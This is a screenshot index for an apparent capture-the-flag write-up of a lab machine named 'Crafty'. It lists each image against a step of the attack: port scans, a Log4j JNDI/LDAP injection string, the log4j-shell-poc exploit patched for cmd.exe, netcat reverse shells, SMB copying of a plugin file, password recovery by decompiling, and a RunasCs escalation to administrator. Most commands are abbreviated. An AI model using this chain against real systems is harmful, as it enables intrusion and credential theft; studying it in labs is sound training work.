# Crafty Screenshot Index

| # | Filename | Command / Action Captured | README Section |
|---|---|---|---|
| 01 | `crafty_01_ping.png` | `ping -c 1 10.129.230.193` result | `1.1 Connectivity Test` |
| 02 | `crafty_02_nmap_allports.png` | `nmap -p- --open ... -oG allPorts` output (part 1) | `1.2 Port Scanning` |
| 03 | `crafty_03_nmap_allports_2.png` | Same full-port scan output (part 2 / continuation) | `1.2 Port Scanning` |
| 04 | `crafty_04_extractports.png` | `extractPorts allPorts` showing open ports `80,25565` | `1.2 Port Scanning` |
| 05 | `crafty_05_nmap_targeted_1.png` | `nmap -sCV -p80,25565 ...` output (part 1) | `1.3 Targeted Scan` |
| 06 | `crafty_06_nmap_targeted_2.png` | `cat targeted` or second pane of targeted scan | `1.3 Targeted Scan` |
| 07 | `crafty_07_whatweb.png` | `whatweb http://10.129.230.193` (IIS / redirect / `crafty.htb`) | `2.1 Web fingerprinting and virtual hosts` |
| 08 | `crafty_08_gobuster.png` | `gobuster dir -u http://crafty.htb ...` results | `2.2 Web content discovery and public pages` |
| 09 | `crafty_09_website_play_reference.png` | Browser: Crafty homepage showing `play.crafty.htb` mention | `2.2 Web content discovery and public pages` |
| 10 | `crafty_10_minecraft_client_offline.png` | Minecraft Console Client: offline login (empty password) connected | `2.3 Minecraft console client (offline login)` |
| 11 | `crafty_11_log4j_ldap_callback.png` | LDAP listener + in-game `${jndi:ldap://.../test}` activity | `3.1 Confirming Log4j JNDI/LDAP interaction` |
| 12 | `crafty_12_log4j_poc_setup.png` | `log4j-shell-poc` clone / `poc.py` JDK requirement message | `3.2 Exploit chain setup (kozmer/log4j-shell-poc)` |
| 13 | `crafty_13_jdk_layout.png` | JDK `1.8.0_20` directory named as required by PoC | `3.2 Exploit chain setup (kozmer/log4j-shell-poc)` |
| 14 | `crafty_14_poc_cmd_exe_patch.png` | Source edit: `String cmd="cmd.exe"` (Windows payload) | `3.2 Exploit chain setup (kozmer/log4j-shell-poc)` |
| 15 | `crafty_15_poc_python_running.png` | `python3 poc.py --userip ...` showing emitted JNDI string | `3.2 Exploit chain setup (kozmer/log4j-shell-poc)` |
| 16 | `crafty_16_netcat_shell.png` | `netcat` listener catching Windows `cmd.exe` session | `3.2 Exploit chain setup (kozmer/log4j-shell-poc)` |
| 17 | `crafty_17_user_shell.png` | User-level `cmd.exe` context / `user.txt` proof | `3.2 Exploit chain setup (kozmer/log4j-shell-poc)` |
| 18 | `crafty_18_smb_plugin_exfil.png` | Impacket SMB share + `copy` of plugin JAR to UNC path | `4.1 Exfiltrating the Minecraft plugin artifact over SMB` |
| 19 | `crafty_19_jdgui_plugin.png` | `jd-gui` opened on recovered plugin JAR | `4.2 Decompiling the plugin to recover credentials` |
| 20 | `crafty_20_jdgui_password.png` | Decompiler view showing recovered password material | `4.2 Decompiling the plugin to recover credentials` |
| 20b | `crafty_20b_jdgui_password_detail.png` | JD-GUI: `Playercounter` / RCON line with password (second capture) | `4.2 Decompiling the plugin to recover credentials` |
| 21 | `crafty_21_certutil_runascs.png` | `certutil.exe -urlcache ... RunasCs.exe` download | `4.3 Administrator access via RunasCs` |
| 22 | `crafty_22_runascs_whoami.png` | `RunasCs.exe` run as `administrator` proving correct password | `4.3 Administrator access via RunasCs` |
| 23 | `crafty_23_runascs_reverse_root.png` | `RunasCs.exe ... cmd.exe -r ...` reverse shell + admin proof | `4.3 Administrator access via RunasCs` |

## Obsidian → case filename mapping (`Pasted image 20260328…`)

Use `scripts/import_crafty_pasted_screenshots.ps1 -SourceDir <folder_with_pastes>` to copy or move files into this directory.

| Pasted image (Obsidian) | Case filename |
|---|---|
| `Pasted image 20260328184907.png` | `crafty_01_ping.png` |
| `Pasted image 20260328184916.png` | `crafty_02_nmap_allports.png` |
| `Pasted image 20260328184927.png` | `crafty_03_nmap_allports_2.png` |
| `Pasted image 20260328184854.png` | `crafty_05_nmap_targeted_1.png` |
| `Pasted image 20260328185244.png` | `crafty_07_whatweb.png` |
| `Pasted image 20260328185415.png` | `crafty_08_gobuster.png` |
| `Pasted image 20260328190329.png` | `crafty_10_minecraft_client_offline.png` |
| `Pasted image 20260328190700.png` | `crafty_11_log4j_ldap_callback.png` |
| `Pasted image 20260328191239.png` | `crafty_12_log4j_poc_setup.png` |
| `Pasted image 20260328191522.png` | `crafty_13_jdk_layout.png` |
| `Pasted image 20260328191730.png` | `crafty_14_poc_cmd_exe_patch.png` |
| `Pasted image 20260328192046.png` | `crafty_15_poc_python_running.png` |
| `Pasted image 20260328192233.png` | `crafty_16_netcat_shell.png` |
| `Pasted image 20260328192439.png` | `crafty_17_user_shell.png` |
| `Pasted image 20260328193424.png` | `crafty_18_smb_plugin_exfil.png` |
| `Pasted image 20260328193756.png` | `crafty_19_jdgui_plugin.png` |
| `Pasted image 20260328193852.png` | `crafty_20_jdgui_password.png` |
| `Pasted image 20260328193848.png` | `crafty_20b_jdgui_password_detail.png` |
| `Pasted image 20260328194423.png` | `crafty_21_certutil_runascs.png` |
| `Pasted image 20260328194643.png` | `crafty_22_runascs_whoami.png` |
| `Pasted image 20260328194853.png` | `crafty_23_runascs_reverse_root.png` |

**No `20260328` paste in notes (capture separately):** `crafty_04_extractports.png`, `crafty_06_nmap_targeted_2.png`, `crafty_09_website_play_reference.png`.
